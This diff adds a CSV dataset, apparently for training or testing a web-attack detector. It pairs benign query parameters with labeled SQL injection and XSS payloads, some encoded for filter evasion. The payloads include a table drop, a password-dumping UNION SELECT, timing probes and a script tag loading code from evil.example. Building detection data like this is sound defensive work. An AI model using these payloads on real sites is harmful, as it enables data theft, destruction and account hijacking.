@@ -1,0 +1,120 @@
+payload,label,type
+hello world,0,benign
+name=ali,0,benign
+id=123,0,benign
+page=2,0,benign
+search=computer network,0,benign
+q=hello,0,benign
+username=mohad,0,benign
+email=test@example.com,0,benign
+category=books,0,benign
+sort=price,0,benign
+order=asc,0,benign
+lang=en,0,benign
+country=iran,0,benign
+city=tehran,0,benign
+product_id=1001,0,benign
+user_id=57,0,benign
+session=abc123,0,benign
+token=abcXYZ,0,benign
+message=hello there,0,benign
+query=network security,0,benign
+title=computer security,0,benign
+date=2026-08-31,0,benign
+limit=20,0,benign
+offset=40,0,benign
+status=active,0,benign
+a=b,0,benign
+a=b&c=d,0,benign
+foo=bar&x=123,0,benign
+name=Ali Ahmadi,0,benign
+description=This is a normal product description.,0,benign
+redirect=/home,0,benign
+next=/dashboard,0,benign
+return=/products,0,benign
+file=report.pdf,0,benign
+format=json,0,benign
+type=user,0,benign
+action=view,0,benign
+keyword=security testing,0,benign
+search=sql tutorial,0,benign
+comment=nice post,0,benign
+path=/images/logo.png,0,benign
+url=/about,0,benign
+ref=homepage,0,benign
+id=100&sort=name,0,benign
+q=hello+world,0,benign
+message=Tom & Jerry,0,benign
+text=50% discount,0,benign
+filter=recent,0,benign
+year=2026,0,benign
+month=08,0,benign
+active=true,0,benign
+username=testuser&password=testpass,0,benign
+' OR '1'='1,1,sql
+' OR 1=1 --,1,sql
+1 OR 1=1,1,sql
+1' OR '1'='1,1,sql
+' UNION SELECT NULL --,1,sql
+"' UNION SELECT username,password FROM users --",1,sql
+admin'--,1,sql
+admin' #,1,sql
+' AND 1=1 --,1,sql
+' AND 1=2 --,1,sql
+1 AND 1=1,1,sql
+1 AND 1=2,1,sql
+' OR 'x'='x,1,sql
+') OR ('1'='1,1,sql
+"1 UNION SELECT NULL,NULL --",1,sql
+1' UNION SELECT database() --,1,sql
+'; DROP TABLE users; --,1,sql
+1; SELECT * FROM users --,1,sql
+' WAITFOR DELAY '0:0:5' --,1,sql
+1' AND SLEEP(5) --,1,sql
+' OR EXISTS(SELECT * FROM users) --,1,sql
+1' ORDER BY 1 --,1,sql
+1' ORDER BY 10 --,1,sql
+' GROUP BY 1 --,1,sql
+' HAVING 1=1 --,1,sql
+%27%20OR%201%3D1%20--,1,sql
+%27%20UNION%20SELECT%20NULL%20--,1,sql
+1%20OR%201%3D1,1,sql
+admin%27%20--,1,sql
+'/**/OR/**/1=1--,1,sql
+SeLeCt * FrOm users,1,sql
+UNION/**/SELECT/**/NULL,1,sql
+' oR '1'='1,1,sql
+1/**/OR/**/1=1,1,sql
+id=1' OR '1'='1,1,sql
+"q=' UNION SELECT NULL,NULL --",1,sql
+search=1 OR 1=1,1,sql
+username=admin'--,1,sql
+<script>alert(1)</script>,1,xss
+<script>confirm(1)</script>,1,xss
+<img src=x onerror=alert(1)>,1,xss
+<svg onload=alert(1)>,1,xss
+<body onload=alert(1)>,1,xss
+<input onfocus=alert(1) autofocus>,1,xss
+<details open ontoggle=alert(1)>,1,xss
+<iframe src=javascript:alert(1)>,1,xss
+<a href=javascript:alert(1)>click</a>,1,xss
+<div onmouseover=alert(1)>hover</div>,1,xss
+<img src=x onerror='alert(document.domain)'>,1,xss
+<script>document.location='https://example.com'</script>,1,xss
+<svg><script>alert(document.domain)</script></svg>,1,xss
+<script src=https://evil.example/x.js></script>,1,xss
+%3Cscript%3Ealert(1)%3C%2Fscript%3E,1,xss
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,1,xss
+<ScRiPt>alert(1)</ScRiPt>,1,xss
+<IMG SRC=x ONERROR=alert(1)>,1,xss
+<svg/onload=alert(1)>,1,xss
+javascript:alert(1),1,xss
+<a href='javascript:alert(1)'>test</a>,1,xss
+<object data='javascript:alert(1)'>,1,xss
+<marquee onstart=alert(1)>,1,xss
+<video><source onerror=alert(1)>,1,xss
+<textarea autofocus onfocus=alert(1)>,1,xss
+<select autofocus onfocus=alert(1)>,1,xss
+<form><button formaction=javascript:alert(1)>x</button></form>,1,xss
+q=<script>alert(1)</script>,1,xss
+search=<img src=x onerror=alert(1)>,1,xss
